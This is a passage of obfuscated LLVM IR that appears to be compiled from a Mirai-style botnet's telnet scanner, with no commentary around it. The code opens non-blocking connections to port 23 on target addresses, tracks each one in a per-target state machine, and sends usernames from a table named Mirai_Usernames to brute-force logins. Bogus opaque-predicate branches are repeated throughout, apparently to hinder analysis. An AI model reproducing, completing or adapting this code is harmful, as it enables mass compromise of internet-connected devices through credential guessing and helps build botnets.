  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %222
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 4
  %235 = load i8, i8* %234, align 2
  %236 = zext i8 %235 to i64
  %237 = icmp eq i64 %236, 34
  %238 = load i32, i32* @x.73
  %239 = load i32, i32* @y.74
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %237, label %246, label %251

; <label>:246:                                    ; preds = %originalBBpart216
  %247 = load i32, i32* %6, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 3
  store i8 1, i8* %250, align 1
  br label %1388

; <label>:251:                                    ; preds = %originalBBpart216
  br label %252

; <label>:252:                                    ; preds = %251, %189
  %253 = load i32, i32* @x.73
  %254 = load i32, i32* @y.74
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %252
  %261 = load i32, i32* @x.73
  %262 = load i32, i32* @y.74
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %269

; <label>:269:                                    ; preds = %originalBBpart220, %originalBBpart212
  %270 = load i32, i32* @x.73
  %271 = load i32, i32* @y.74
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %269
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext 23) #10
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %279, i16* %280, align 2
  %281 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %282 = getelementptr inbounds [8 x i8], [8 x i8]* %281, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %282, i8 0, i64 8, i32 4, i1 false)
  %283 = load i32, i32* %6, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 1
  %287 = load i32, i32* %286, align 4
  %288 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %289 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %288, i32 0, i32 0
  store i32 %287, i32* %289, align 4
  %290 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %291 = load i32, i32* %6, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  store i32 %290, i32* %294, align 16
  %295 = load i32, i32* %6, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = icmp eq i32 %299, -1
  %301 = load i32, i32* @x.73
  %302 = load i32, i32* @y.74
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %300, label %309, label %310

; <label>:309:                                    ; preds = %originalBBpart224
  br label %1388

; <label>:310:                                    ; preds = %originalBBpart224
  %311 = load i32, i32* %6, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = load i32, i32* %6, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = call i32 (i32, i32, ...) @fcntl(i32 %320, i32 3, i8* null)
  %322 = or i32 %321, 2048
  %323 = call i32 (i32, i32, ...) @fcntl(i32 %315, i32 4, i32 %322)
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %330 = call i32 @connect(i32 %328, %struct.sockaddr* %329, i32 16)
  %331 = icmp eq i32 %330, -1
  br i1 %331, label %332, label %340

; <label>:332:                                    ; preds = %310
  %333 = call i32* @__errno_location() #10
  %334 = load i32, i32* %333, align 4
  %335 = icmp ne i32 %334, 115
  br i1 %335, label %336, label %340

; <label>:336:                                    ; preds = %332
  %337 = load i32, i32* %6, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %338
  call void @reset_telstate(%struct.telstate_t* %339)
  br label %360

; <label>:340:                                    ; preds = %332, %310
  %341 = load i32, i32* @x.73
  %342 = load i32, i32* @y.74
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %340
  %349 = load i32, i32* %6, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %350
  call void @advance_telstate(%struct.telstate_t* %351, i32 1)
  %352 = load i32, i32* @x.73
  %353 = load i32, i32* @y.74
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %360

; <label>:360:                                    ; preds = %originalBBpart228, %336
  br label %1387

; <label>:361:                                    ; preds = %122
  br label %362

; <label>:362:                                    ; preds = %361
  %363 = load i32, i32* @x.73
  %364 = load i32, i32* @y.74
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %362
  %371 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %372 = getelementptr inbounds [16 x i64], [16 x i64]* %371, i64 0, i64 0
  %373 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %372) #5, !srcloc !6
  %374 = extractvalue { i64, i64* } %373, 0
  %375 = extractvalue { i64, i64* } %373, 1
  %376 = trunc i64 %374 to i32
  store i32 %376, i32* %21, align 4
  %377 = ptrtoint i64* %375 to i64
  %378 = trunc i64 %377 to i32
  store i32 %378, i32* %22, align 4
  %379 = load i32, i32* @x.73
  %380 = load i32, i32* @y.74
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %387

; <label>:387:                                    ; preds = %originalBBpart232
  br label %388

; <label>:388:                                    ; preds = %387
  %389 = load i32, i32* @x.73
  %390 = load i32, i32* @y.74
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %388
  %397 = load i32, i32* %6, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %398
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %399, i32 0, i32 0
  %401 = load i32, i32* %400, align 16
  %402 = srem i32 %401, 64
  %403 = zext i32 %402 to i64
  %404 = shl i64 1, %403
  %405 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %406 = load i32, i32* %6, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 16
  %411 = sdiv i32 %410, 64
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds [16 x i64], [16 x i64]* %405, i64 0, i64 %412
  %414 = load i64, i64* %413, align 8
  %415 = or i64 %414, %404
  store i64 %415, i64* %413, align 8
  %416 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %416, align 8
  %417 = load i32, i32* %3, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %418, i64* %419, align 8
  %420 = load i32, i32* %6, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %421
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %422, i32 0, i32 0
  %424 = load i32, i32* %423, align 16
  %425 = add nsw i32 %424, 1
  %426 = call i32 @select(i32 %425, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %426, i32* %7, align 4
  %427 = load i32, i32* %7, align 4
  %428 = icmp eq i32 %427, 1
  %429 = load i32, i32* @x.73
  %430 = load i32, i32* @y.74
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart267, label %originalBB34alteredBB

originalBBpart267:                                ; preds = %originalBB34
  br i1 %428, label %437, label %491

; <label>:437:                                    ; preds = %originalBBpart267
  %438 = call i64 @time(i64* null) #5
  %439 = trunc i64 %438 to i32
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 7
  store i32 %439, i32* %443, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %444 = load i32, i32* %6, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 0
  %448 = load i32, i32* %447, align 16
  %449 = bitcast i32* %15 to i8*
  %450 = call i32 @getsockopt(i32 %448, i32 1, i32 4, i8* %449, i32* %14) #5
  %451 = load i32, i32* %15, align 4
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %453, label %457

; <label>:453:                                    ; preds = %437
  %454 = load i32, i32* %6, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %455
  call void @reset_telstate(%struct.telstate_t* %456)
  br label %490

; <label>:457:                                    ; preds = %437
  %458 = load i32, i32* @x.73
  %459 = load i32, i32* @y.74
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %457
  %466 = load i32, i32* %6, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = load i32, i32* %6, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 0
  %475 = load i32, i32* %474, align 16
  %476 = call i32 (i32, i32, ...) @fcntl(i32 %475, i32 3, i8* null)
  %477 = and i32 %476, -2049
  %478 = call i32 (i32, i32, ...) @fcntl(i32 %470, i32 4, i32 %477)
  %479 = load i32, i32* %6, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %480
  call void @advance_telstate(%struct.telstate_t* %481, i32 2)
  %482 = load i32, i32* @x.73
  %483 = load i32, i32* @y.74
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart280, label %originalBB69alteredBB

originalBBpart280:                                ; preds = %originalBB69
  br label %490

; <label>:490:                                    ; preds = %originalBBpart280, %453
  br label %1388

; <label>:491:                                    ; preds = %originalBBpart267
  %492 = load i32, i32* %7, align 4
  %493 = icmp eq i32 %492, -1
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %491
  %495 = load i32, i32* %6, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %496
  call void @reset_telstate(%struct.telstate_t* %497)
  br label %1388

; <label>:498:                                    ; preds = %491
  %499 = load i32, i32* @x.73
  %500 = load i32, i32* @y.74
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %498
  %507 = load i32, i32* @x.73
  %508 = load i32, i32* @y.74
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %515

; <label>:515:                                    ; preds = %originalBBpart284
  %516 = load i32, i32* %6, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 7
  %520 = load i32, i32* %519, align 16
  %521 = add i32 %520, 7
  %522 = zext i32 %521 to i64
  %523 = call i64 @time(i64* null) #5
  %524 = icmp slt i64 %522, %523
  br i1 %524, label %525, label %529

; <label>:525:                                    ; preds = %515
  %526 = load i32, i32* %6, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %527
  call void @reset_telstate(%struct.telstate_t* %528)
  br label %529

; <label>:529:                                    ; preds = %525, %515
  br label %1387

; <label>:530:                                    ; preds = %122
  %531 = load i32, i32* %6, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = load i32, i32* %3, align 4
  %537 = load i32, i32* %6, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 9
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @read_until_response(i32 %535, i32 %536, i8* %541, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %543 = icmp ne i32 %542, 0
  br i1 %543, label %544, label %583

; <label>:544:                                    ; preds = %530
  %545 = load i32, i32* @x.73
  %546 = load i32, i32* @y.74
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %544
  %553 = call i64 @time(i64* null) #5
  %554 = trunc i64 %553 to i32
  %555 = load i32, i32* %6, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 7
  store i32 %554, i32* %558, align 16
  %559 = load i32, i32* %6, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 9
  %563 = load i8*, i8** %562, align 8
  %564 = call i32 @contains_fail(i8* %563)
  %565 = icmp ne i32 %564, 0
  %566 = load i32, i32* @x.73
  %567 = load i32, i32* @y.74
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %565, label %574, label %578

; <label>:574:                                    ; preds = %originalBBpart288
  %575 = load i32, i32* %6, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %576
  call void @advance_telstate(%struct.telstate_t* %577, i32 0)
  br label %582

; <label>:578:                                    ; preds = %originalBBpart288
  %579 = load i32, i32* %6, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %580
  call void @advance_telstate(%struct.telstate_t* %581, i32 3)
  br label %582

; <label>:582:                                    ; preds = %578, %574
  br label %1388

; <label>:583:                                    ; preds = %530
  %584 = load i32, i32* @x.73
  %585 = load i32, i32* @y.74
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %583
  %592 = load i32, i32* %6, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 7
  %596 = load i32, i32* %595, align 16
  %597 = add i32 %596, 7
  %598 = zext i32 %597 to i64
  %599 = call i64 @time(i64* null) #5
  %600 = icmp slt i64 %598, %599
  %601 = load i32, i32* @x.73
  %602 = load i32, i32* @y.74
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart2104, label %originalBB90alteredBB

originalBBpart2104:                               ; preds = %originalBB90
  br i1 %600, label %609, label %613

; <label>:609:                                    ; preds = %originalBBpart2104
  %610 = load i32, i32* %6, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %611
  call void @reset_telstate(%struct.telstate_t* %612)
  br label %613

; <label>:613:                                    ; preds = %609, %originalBBpart2104
  %614 = load i32, i32* @x.73
  %615 = load i32, i32* @y.74
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %613
  %622 = load i32, i32* @x.73
  %623 = load i32, i32* @y.74
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %1387

; <label>:630:                                    ; preds = %122
  %631 = load i32, i32* @x.73
  %632 = load i32, i32* @y.74
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %630
  %639 = load i32, i32* %6, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 0
  %643 = load i32, i32* %642, align 16
  %644 = load i32, i32* %6, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 4
  %648 = load i8, i8* %647, align 2
  %649 = zext i8 %648 to i64
  %650 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %649
  %651 = load i8*, i8** %650, align 8
  %652 = load i32, i32* %6, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 4
  %656 = load i8, i8* %655, align 2
  %657 = zext i8 %656 to i64
  %658 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %657
  %659 = load i8*, i8** %658, align 8
  %660 = call i64 @strlen(i8* %659) #9
  %661 = call i64 @send(i32 %643, i8* %651, i64 %660, i32 16384)
  %662 = icmp slt i64 %661, 0
  %663 = load i32, i32* @x.73
  %664 = load i32, i32* @y.74
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %662, label %671, label %675

; <label>:671:                                    ; preds = %originalBBpart2112
  %672 = load i32, i32* %6, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %673
  call void @reset_telstate(%struct.telstate_t* %674)
  br label %1388

; <label>:675:                                    ; preds = %originalBBpart2112
  %676 = load i32, i32* @x.73
  %677 = load i32, i32* @y.74
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %675
  %684 = load i32, i32* %6, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 0
  %688 = load i32, i32* %687, align 16
  %689 = call i64 @send(i32 %688, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %690 = icmp slt i64 %689, 0
  %691 = load i32, i32* @x.73
  %692 = load i32, i32* @y.74
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %690, label %699, label %719

; <label>:699:                                    ; preds = %originalBBpart2116
  %700 = load i32, i32* @x.73
  %701 = load i32, i32* @y.74
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %699
  %708 = load i32, i32* %6, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %709
  call void @reset_telstate(%struct.telstate_t* %710)
  %711 = load i32, i32* @x.73
  %712 = load i32, i32* @y.74
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1388

; <label>:719:                                    ; preds = %originalBBpart2116
  %720 = load i32, i32* @x.73
  %721 = load i32, i32* @y.74
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %719
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %729
  call void @advance_telstate(%struct.telstate_t* %730, i32 4)
  %731 = load i32, i32* @x.73
  %732 = load i32, i32* @y.74
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1387

; <label>:739:                                    ; preds = %122
  %740 = load i32, i32* @x.73
  %741 = load i32, i32* @y.74
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %739
  %748 = load i32, i32* %6, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 0
  %752 = load i32, i32* %751, align 16
  %753 = load i32, i32* %3, align 4
  %754 = load i32, i32* %6, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 9
  %758 = load i8*, i8** %757, align 8
  %759 = call i32 @read_until_response(i32 %752, i32 %753, i8* %758, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %760 = icmp ne i32 %759, 0
  %761 = load i32, i32* @x.73
